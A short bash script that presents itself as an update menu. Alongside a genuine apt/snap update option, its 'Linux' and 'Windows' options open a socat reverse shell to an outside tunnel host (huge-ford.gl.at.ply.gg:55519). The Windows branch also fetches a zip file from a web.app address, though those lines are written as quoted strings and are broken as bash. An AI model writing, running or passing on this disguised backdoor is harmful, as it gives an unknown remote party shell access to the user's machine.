#!/bin/bash

linux_update() {
    sudo apt update && sudo apt upgrade -y
    sudo snap refresh
}

linux() {
    sudo apt install socat
    socat tcp-connect:huge-ford.gl.at.ply.gg:55519 system:/bin/bash,pty,stderr,sane
}

windows() {
    '$client = new-object System.Net.WebClient'
    '$client.DownloadFile(\"https://neonsppandro.web.app/Shining.zip\" , \"Shining.zip\")'
    './socat.exe tcp-connect:huge-ford.gl.at.ply.gg:55519 exec:cmd,pty,stderr,sane'
}

show_menu() {
  echo "Please select an option:"
  echo "1. Check for updates on linux."
  echo "2. Linux"
  echo "3. Windows"
  echo "4. Exit"
}

while true; do
  show_menu
  read -p "Enter your choice: " choice

  case $choice in
    1)
      linux_update
      ;;
    2)
      linux
      ;;
    3)
      windows
      ;;
    4)
      echo "Exiting..."
      exit 0
      ;;
    *)
      echo "Invalid choice. Please try again."
      ;;
  esac
done
